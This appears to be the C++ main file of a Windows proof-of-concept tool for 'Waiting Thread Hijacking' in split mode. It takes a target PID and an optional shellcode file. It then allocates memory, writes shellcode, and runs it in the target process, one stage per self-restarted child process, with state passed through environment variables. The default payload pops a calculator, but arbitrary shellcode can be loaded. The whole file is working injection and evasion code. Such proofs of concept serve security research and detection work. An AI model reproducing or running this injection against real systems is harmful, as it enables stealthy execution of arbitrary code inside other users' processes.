#include <windows.h>
#include <iostream>

#include "hijacking.h"
#include "common.h"
#include "ntddk.h"
#include "shellcode.h"

enum t_result {
    RET_OK = 0,
    RET_PID_INVALID,
    RET_OPEN_PROCESS_FAILED,
    RET_PASS_MEM_FAILED,
    RET_ALLOC_FAILED,
    RET_WRITE_FAILED,
    RET_EXECUTE_FAILED,
    RET_INVALID_STATE,
    RET_OTHER_ERR
};

enum t_state {
    STATE_UNINITIALIZED = 0,
    STATE_ALLOC = 1,
    STATE_WRITE,
    STATE_EXECUTE,
    STATE_MAX
};

DWORD g_WaitReason = WrQueue;

BYTE* wrap_shellcode(IN BYTE* raw_shellcode, IN size_t raw_shellcode_size, OUT size_t& wrapped_shc_size)
{
    if (!raw_shellcode_size) {
        return nullptr;
    }
    const size_t full_size = sizeof(g_shellcode_stub) + raw_shellcode_size;
    BYTE* full_shc = (BYTE*)::calloc(full_size, 1);
    if (!full_shc) {
        return nullptr;
    }
    wrapped_shc_size = full_size;
    ::memcpy(full_shc, g_shellcode_stub, sizeof(g_shellcode_stub));
    ::memcpy(full_shc + sizeof(g_shellcode_stub), raw_shellcode, raw_shellcode_size);
    return full_shc;
}

ULONGLONG get_env(const char *var_name, bool isHex = false)
{
    ULONGLONG state = 0;
    char env_str[100] = { 0 };
    if (!GetEnvironmentVariableA(var_name, env_str, 100)) {
        return 0;
    }
    state = loadInt(env_str, isHex);
    return state;
}

BOOL set_env(const char* var_name, ULONGLONG val, bool isHex = false)
{
    std::string next = writeInt(val, isHex);
    return SetEnvironmentVariableA(var_name, next.c_str());
}

t_result execute_state(t_state state, BYTE *shellc_buf, size_t shellc_size)
{
    DWORD processID = get_env("PID");
    if (!processID) {
        return RET_PID_INVALID;
    }
    std::cout << "[#] PID: " <<  std::dec << GetCurrentProcessId() << " : " << "Executing State: " << state << "\n";

    if (state == STATE_ALLOC) {
        LPVOID shellcodePtr = alloc_memory_in_process(processID, shellc_size);
        if (shellcodePtr) {
            set_env("SHC", (ULONGLONG)shellcodePtr, true);
            return RET_OK;
        }
        return RET_ALLOC_FAILED;
    }
    ULONGLONG shellcodePtr = get_env("SHC", true);
    if (!shellcodePtr) {
        return RET_PASS_MEM_FAILED;
    }
    if (state == STATE_WRITE) {
        if (write_shc_into_process(processID, (LPVOID)shellcodePtr, shellc_buf, shellc_size)) {
            return RET_OK;
        }
        return RET_WRITE_FAILED;
    }
    if (state == STATE_EXECUTE) {
        if (run_injected(processID, shellcodePtr, shellc_size, g_WaitReason)) {
            return RET_OK;
        }
        return RET_EXECUTE_FAILED;
    }
    return RET_INVALID_STATE;
}

bool restart_updated(IN LPSTR path)
{
    PROCESS_INFORMATION pi = { 0 };
    STARTUPINFO si = { 0 };
    memset(&si, 0, sizeof(STARTUPINFO));
    si.cb = sizeof(STARTUPINFO);

    memset(&pi, 0, sizeof(PROCESS_INFORMATION));

    if (!CreateProcessA(
        path,
        NULL,
        NULL, //lpProcessAttributes
        NULL, //lpThreadAttributes
        FALSE, //bInheritHandles
        0, //dwCreationFlags
        NULL, //lpEnvironment 
        NULL, //lpCurrentDirectory
        &si, //lpStartupInfo
        &pi //lpProcessInformation
    ))
    {
        std::cerr << "[ERROR] CreateProcess failed, Error = " << std::dec << GetLastError() << std::endl;
        return false;
    }
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return true;
}

int main(int argc, char* argv[])
{
    char my_name[MAX_PATH] = { 0 };
    GetModuleFileNameA(NULL, my_name, MAX_PATH);
#ifdef _DEBUG
    std::cout << "[#] PID: " << std::dec << GetCurrentProcessId() << std::endl;
    std::cout << "[#] Path: " << my_name << std::endl;
#endif

    t_state state = (t_state)get_env("RES");

#ifdef _DEBUG
    std::cout << "[#] State: " << state << "\n";
#endif

    if (state == STATE_UNINITIALIZED)
    {
        // check process:
        DWORD processID = 0;
        if (argc < 2) {
            std::cout << "Waiting Thread Hijacking (Split Mode). Target Wait Reason: " << KWAIT_REASON_TO_STRING(g_WaitReason) << "\n"
                << "Arg <PID> [shellcode_file*]\n"
                << "* - optional; requires shellcode with clean exit"
                << std::endl;
            return 0;
        }
        if (argc > 2) {
            const char* filename = argv[2];
            SetEnvironmentVariableA("SHC_FILE", filename);
        }
        processID = loadInt(argv[1], false);
        if (!processID) {
            std::cerr << "No process ID supplied!\n";
            return -1;
        }
        std::cout << "Supplied PID: " << processID << "\n";
        HANDLE hProcess = OpenProcess(PROCESS_VM_OPERATION, FALSE, processID);
        if (!hProcess) {
            std::cerr << "Failed opening the process!\n";
            return RET_OPEN_PROCESS_FAILED;
        }
        CloseHandle(hProcess);
        set_env("PID", processID);
    }
    else
    {
        BYTE* payload = g_shellcode_pop_calc;
        size_t payload_size = sizeof(g_shellcode_pop_calc);
        bool custom_shc = false;

        char filename[MAX_PATH] = { 0 };
        if (GetEnvironmentVariableA("SHC_FILE", filename, MAX_PATH)) {
            payload = load_from_file(filename, payload_size);
            if (!payload) {
                std::cerr << "Failed loading shellcode from file: " << filename << std::endl;
                return RET_OTHER_ERR;
            }
            custom_shc = true;
            std::cout << "Using payload from file: " << filename << std::endl;
        }

        size_t shellc_size = 0;
        BYTE* shellc_buf = wrap_shellcode(payload, payload_size, shellc_size);

        t_result res = execute_state(state, shellc_buf, shellc_size);
        ::free(shellc_buf); shellc_size = 0;
        if (custom_shc) {
            ::free(payload);
        }
        if (res != RET_OK) {
            std::cerr << "Failed, result: " << res << "\n";
            return res;
        }
    }
    DWORD new_state = state + 1;
    if (new_state == STATE_MAX) {
        std::cout << "[+] OK, finished!" << std::endl;
        return RET_OK;
    }
    set_env("RES", (ULONGLONG)new_state);
    if (restart_updated(my_name)) {
        return RET_OK;
    }
    return RET_OTHER_ERR;
}
